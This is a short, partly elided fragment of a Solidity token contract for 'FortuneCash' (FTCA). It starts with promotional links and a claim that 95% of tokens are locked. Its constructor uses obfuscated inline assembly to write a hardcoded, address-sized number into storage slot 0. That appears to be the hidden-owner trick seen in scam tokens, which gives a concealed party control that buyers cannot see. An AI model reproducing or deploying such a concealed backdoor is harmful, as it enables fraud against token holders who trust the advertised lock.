...
/*
Welcome to FortuneCash Crypto WORLD!

Telegram: https://t.me/FortuneCash/
Twitter: https://twitter.com/FortuneCash/
Website: https://FortuneCash.crypto
95% of tokens - LOCKED!
...
contract FortuneCash {
    string public constant name = "FortuneCash";
    string public constant symbol = "FTCA";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(827653262835131624910343961562366199132039492526, 3))}
